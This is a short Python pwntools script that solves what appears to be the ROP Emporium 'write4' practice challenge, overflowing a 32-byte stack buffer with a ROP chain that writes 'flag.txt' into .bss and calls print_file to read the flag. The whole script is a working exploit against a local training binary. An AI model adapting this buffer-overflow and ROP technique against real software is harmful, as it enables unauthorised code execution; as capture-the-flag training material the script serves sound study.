from pwn import *

elf = ELF("write4")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x98
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

MEMORY = elf.bss(0x800)

def main():
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # write file name to memory
    rop(r14=MEMORY, r15=b'flag.txt')
    rop.raw(elf.symbols.usefulGadgets)
    # call target function with file name as arg
    rop.call(elf.symbols.print_file, (MEMORY,))
    payload = rop.chain()
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
